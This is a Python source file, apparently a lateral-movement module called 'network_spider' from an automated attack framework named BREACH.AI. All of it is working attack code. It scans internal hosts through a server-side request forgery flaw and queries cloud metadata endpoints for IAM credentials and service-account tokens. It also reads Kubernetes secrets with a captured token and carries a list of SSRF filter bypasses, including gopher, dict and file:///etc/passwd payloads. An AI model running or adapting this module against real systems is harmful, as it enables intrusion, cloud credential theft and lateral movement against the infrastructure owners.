"""
BREACH.AI v2 - Network Spider

Internal network discovery module for mapping internal infrastructure
via SSRF, DNS rebinding, cloud metadata, and service enumeration.
"""

import asyncio
import ipaddress
import json
import re
from typing import Optional
from urllib.parse import urljoin, urlparse

from breach.modules.base import (
    LateralModule,
    ModuleConfig,
    ModuleInfo,
    register_module,
)
from breach.core.killchain import (
    BreachPhase,
    ModuleResult,
    EvidenceType,
    AccessLevel,
    Severity,
)


# Common internal network ranges
INTERNAL_RANGES = [
    "10.0.0.0/8",
    "172.16.0.0/12",
    "192.168.0.0/16",
    "169.254.0.0/16",  # Link-local (includes cloud metadata)
    "127.0.0.0/8",     # Localhost
]

# Common internal ports to scan
INTERNAL_PORTS = {
    # Databases
    3306: {"service": "mysql", "type": "database"},
    5432: {"service": "postgresql", "type": "database"},
    27017: {"service": "mongodb", "type": "database"},
    6379: {"service": "redis", "type": "cache"},
    11211: {"service": "memcached", "type": "cache"},
    9200: {"service": "elasticsearch", "type": "database"},
    5984: {"service": "couchdb", "type": "database"},
    # Message queues
    5672: {"service": "rabbitmq", "type": "queue"},
    9092: {"service": "kafka", "type": "queue"},
    # Monitoring
    9090: {"service": "prometheus", "type": "monitoring"},
    3000: {"service": "grafana", "type": "monitoring"},
    8500: {"service": "consul", "type": "service_mesh"},
    # CI/CD
    8080: {"service": "jenkins", "type": "cicd"},
    8081: {"service": "nexus", "type": "cicd"},
    # Container
    2375: {"service": "docker", "type": "container"},
    2376: {"service": "docker_tls", "type": "container"},
    6443: {"service": "kubernetes", "type": "container"},
    10250: {"service": "kubelet", "type": "container"},
    # Web
    80: {"service": "http", "type": "web"},
    443: {"service": "https", "type": "web"},
    8443: {"service": "https_alt", "type": "web"},
    # Admin
    22: {"service": "ssh", "type": "admin"},
    3389: {"service": "rdp", "type": "admin"},
    5985: {"service": "winrm", "type": "admin"},
}

# Cloud metadata endpoints
CLOUD_METADATA = {
    "aws": {
        "endpoint": "http://169.254.169.254/latest/meta-data/",
        "paths": [
            "ami-id",
            "instance-id",
            "instance-type",
            "local-hostname",
            "local-ipv4",
            "public-ipv4",
            "iam/security-credentials/",
            "network/interfaces/macs/",
        ],
    },
    "gcp": {
        "endpoint": "http://169.254.169.254/computeMetadata/v1/",
        "headers": {"Metadata-Flavor": "Google"},
        "paths": [
            "project/project-id",
            "instance/hostname",
            "instance/network-interfaces/",
            "instance/service-accounts/default/token",
        ],
    },
    "azure": {
        "endpoint": "http://169.254.169.254/metadata/instance",
        "headers": {"Metadata": "true"},
        "params": "api-version=2021-02-01",
    },
    "digitalocean": {
        "endpoint": "http://169.254.169.254/metadata/v1/",
        "paths": ["id", "hostname", "region", "interfaces/"],
    },
}

# SSRF bypass techniques
SSRF_BYPASSES = [
    # Standard
    "http://{host}:{port}{path}",
    # URL encoding
    "http://{host_encoded}:{port}{path}",
    # Decimal IP
    "http://{decimal_ip}:{port}{path}",
    # Octal IP
    "http://{octal_ip}:{port}{path}",
    # Hex IP
    "http://0x{hex_ip}:{port}{path}",
    # IPv6 localhost
    "http://[::1]:{port}{path}",
    "http://[::]:{port}{path}",
    # Domain variations
    "http://{host}.{domain}:{port}{path}",
    "http://127.0.0.1.nip.io:{port}{path}",
    # URL tricks
    "http://google.com@{host}:{port}{path}",
    "http://{host}%00.evil.com:{port}{path}",
    # Protocol tricks
    "gopher://{host}:{port}/_",
    "dict://{host}:{port}/info",
    "file:///etc/passwd",
]

# Common internal service endpoints
INTERNAL_ENDPOINTS = {
    "kubernetes": [
        "/api",
        "/api/v1",
        "/api/v1/namespaces",
        "/api/v1/pods",
        "/api/v1/secrets",
        "/apis",
        "/healthz",
        "/version",
    ],
    "docker": [
        "/version",
        "/info",
        "/containers/json",
        "/images/json",
    ],
    "elasticsearch": [
        "/",
        "/_cat/indices",
        "/_cluster/health",
        "/_nodes",
    ],
    "jenkins": [
        "/api/json",
        "/script",
        "/asynchPeople/",
    ],
    "consul": [
        "/v1/agent/self",
        "/v1/catalog/services",
        "/v1/kv/",
    ],
    "prometheus": [
        "/api/v1/targets",
        "/api/v1/status/config",
        "/metrics",
    ],
}


@register_module
class NetworkSpider(LateralModule):
    """
    Network Spider - Internal network discovery and mapping.

    Techniques:
    - SSRF to internal services
    - Cloud metadata enumeration
    - DNS rebinding
    - Internal port scanning
    - Kubernetes/Docker API discovery
    - Service mesh enumeration
    """

    info = ModuleInfo(
        name="network_spider",
        phase=BreachPhase.LATERAL,
        description="Internal network discovery via SSRF, metadata, service enumeration",
        author="BREACH.AI",
        techniques=["T1046", "T1018", "T1552.005"],  # Network Scanning, Remote Discovery, Cloud API
        platforms=["web", "api", "cloud", "infrastructure"],
        requires_access=True,
        required_access_level=AccessLevel.USER,
    )

    async def check(self, config: ModuleConfig) -> bool:
        """Check if we have access for network discovery."""
        # Need SSRF capability or shell access
        has_ssrf = config.chain_data.get("ssrf_capability", False)
        has_shell = config.chain_data.get("shell_access", False)
        has_rce = config.chain_data.get("rce_capability", False)
        in_cloud = config.chain_data.get("in_cloud", False)

        return has_ssrf or has_shell or has_rce or in_cloud

    async def run(self, config: ModuleConfig) -> ModuleResult:
        """Execute network discovery."""
        self._start_execution()

        discovered = {
            "hosts": [],
            "services": [],
            "internal_apis": [],
            "cloud_info": None,
        }

        # Try cloud metadata enumeration
        cloud_result = await self._enumerate_cloud_metadata(config)
        if cloud_result:
            discovered["cloud_info"] = cloud_result

        # Discover internal services via SSRF
        if config.chain_data.get("ssrf_capability"):
            ssrf_results = await self._ssrf_internal_scan(config)
            discovered["hosts"].extend(ssrf_results.get("hosts", []))
            discovered["services"].extend(ssrf_results.get("services", []))

        # Check for internal APIs
        api_results = await self._discover_internal_apis(config)
        discovered["internal_apis"].extend(api_results)

        # Check Kubernetes if we're in a pod
        if config.chain_data.get("in_kubernetes"):
            k8s_results = await self._discover_kubernetes(config)
            discovered["services"].extend(k8s_results)

        # Add evidence
        if discovered["hosts"]:
            self._add_evidence(
                evidence_type=EvidenceType.NETWORK_TOPOLOGY,
                description=f"Discovered {len(discovered['hosts'])} internal hosts",
                content={
                    "host_count": len(discovered["hosts"]),
                    "hosts": discovered["hosts"][:20],
                },
                proves="Internal network accessible",
                severity=Severity.HIGH,
            )

        if discovered["services"]:
            self._add_evidence(
                evidence_type=EvidenceType.API_RESPONSE,
                description=f"Discovered {len(discovered['services'])} internal services",
                content={
                    "service_count": len(discovered["services"]),
                    "services": discovered["services"][:20],
                },
                proves="Internal services accessible for lateral movement",
                severity=Severity.HIGH,
            )

        if discovered["cloud_info"]:
            self._add_evidence(
                evidence_type=EvidenceType.API_RESPONSE,
                description=f"Cloud metadata enumerated: {discovered['cloud_info'].get('provider', 'unknown')}",
                content=discovered["cloud_info"],
                proves="Cloud infrastructure information disclosed",
                severity=Severity.HIGH,
            )

        if discovered["internal_apis"]:
            self._add_evidence(
                evidence_type=EvidenceType.API_RESPONSE,
                description=f"Discovered {len(discovered['internal_apis'])} internal APIs",
                content={"apis": discovered["internal_apis"][:20]},
                proves="Internal APIs accessible",
                severity=Severity.HIGH,
            )

        total_found = (
            len(discovered["hosts"]) +
            len(discovered["services"]) +
            len(discovered["internal_apis"]) +
            (1 if discovered["cloud_info"] else 0)
        )

        return self._create_result(
            success=total_found > 0,
            action="network_discovery",
            details=f"Discovered {len(discovered['hosts'])} hosts, {len(discovered['services'])} services",
            data_extracted=discovered if total_found > 0 else None,
            enables_modules=["service_breaker", "credential_harvester", "database_pillager"],
        )

    async def _enumerate_cloud_metadata(self, config: ModuleConfig) -> Optional[dict]:
        """Enumerate cloud metadata service."""
        result = None

        for provider, meta_config in CLOUD_METADATA.items():
            endpoint = meta_config["endpoint"]
            headers = meta_config.get("headers", {})
            params = meta_config.get("params", "")

            url = f"{endpoint}?{params}" if params else endpoint

            response = await self._safe_request("GET", url, headers=headers, timeout=5)

            if response and response.get("status_code") == 200:
                result = {
                    "provider": provider,
                    "endpoint": endpoint,
                    "data": {},
                }

                # Enumerate specific paths
                for path in meta_config.get("paths", []):
                    path_url = urljoin(endpoint, path)
                    if params:
                        path_url = f"{path_url}?{params}"

                    path_response = await self._safe_request(
                        "GET", path_url, headers=headers, timeout=5
                    )

                    if path_response and path_response.get("status_code") == 200:
                        result["data"][path] = path_response.get("text", "")[:500]

                break  # Found cloud provider

        return result

    async def _ssrf_internal_scan(self, config: ModuleConfig) -> dict:
        """Scan internal network via SSRF."""
        results = {"hosts": [], "services": []}

        # Get SSRF endpoint from chain data
        ssrf_endpoint = config.chain_data.get("ssrf_endpoint", "")
        ssrf_param = config.chain_data.get("ssrf_param", "url")

        if not ssrf_endpoint:
            return results

        # Common internal IPs to check
        internal_ips = [
            "127.0.0.1",
            "localhost",
            "10.0.0.1",
            "172.17.0.1",  # Docker gateway
            "192.168.1.1",
        ]

        # Add IPs from cloud metadata if available
        if config.chain_data.get("internal_ips"):
            internal_ips.extend(config.chain_data["internal_ips"])

        for ip in internal_ips[:10]:
            for port, service_info in list(INTERNAL_PORTS.items())[:15]:
                target_url = f"http://{ip}:{port}/"

                # Build SSRF request
                ssrf_url = f"{ssrf_endpoint}?{ssrf_param}={target_url}"

                response = await self._safe_request("GET", ssrf_url, timeout=10)

                if response and response.get("status_code") == 200:
                    text = response.get("text", "")

                    # Check if we got actual content (not error page)
                    if len(text) > 10 and "error" not in text.lower()[:100]:
                        host_entry = {"ip": ip, "port": port}
                        if host_entry not in results["hosts"]:
                            results["hosts"].append(host_entry)

                        results["services"].append({
                            "ip": ip,
                            "port": port,
                            "service": service_info["service"],
                            "type": service_info["type"],
                            "accessible": True,
                        })

        return results

    async def _discover_internal_apis(self, config: ModuleConfig) -> list:
        """Discover internal APIs."""
        apis = []

        # If we have SSRF, use it to check internal API endpoints
        ssrf_endpoint = config.chain_data.get("ssrf_endpoint", "")
        ssrf_param = config.chain_data.get("ssrf_param", "url")

        if not ssrf_endpoint:
            return apis

        # Check common internal API hosts
        internal_hosts = [
            "kubernetes.default.svc",
            "kubernetes",
            "docker",
            "consul",
            "vault",
            "elasticsearch",
            "redis",
        ]

        for host in internal_hosts:
            for service, endpoints in INTERNAL_ENDPOINTS.items():
                for endpoint in endpoints[:3]:  # Limit per service
                    target_url = f"http://{host}{endpoint}"
                    ssrf_url = f"{ssrf_endpoint}?{ssrf_param}={target_url}"

                    response = await self._safe_request("GET", ssrf_url, timeout=10)

                    if response and response.get("status_code") == 200:
                        text = response.get("text", "")
                        if len(text) > 5:
                            apis.append({
                                "host": host,
                                "service": service,
                                "endpoint": endpoint,
                                "response_size": len(text),
                            })
                            break  # Found this service

        return apis

    async def _discover_kubernetes(self, config: ModuleConfig) -> list:
        """Discover Kubernetes resources from within a pod."""
        services = []

        # Check for Kubernetes service account
        k8s_host = config.chain_data.get("kubernetes_api_host", "kubernetes.default.svc")
        k8s_token = config.chain_data.get("kubernetes_token", "")

        if not k8s_token:
            return services

        # Try to list services
        headers = {"Authorization": f"Bearer {k8s_token}"}

        for endpoint in INTERNAL_ENDPOINTS["kubernetes"]:
            url = f"https://{k8s_host}:443{endpoint}"

            response = await self._safe_request(
                "GET",
                url,
                headers=headers,
                timeout=10,
            )

            if response and response.get("status_code") == 200:
                try:
                    data = json.loads(response.get("text", "{}"))
                    services.append({
                        "type": "kubernetes_api",
                        "endpoint": endpoint,
                        "data_preview": str(data)[:200],
                    })
                except json.JSONDecodeError:
                    pass

        return services
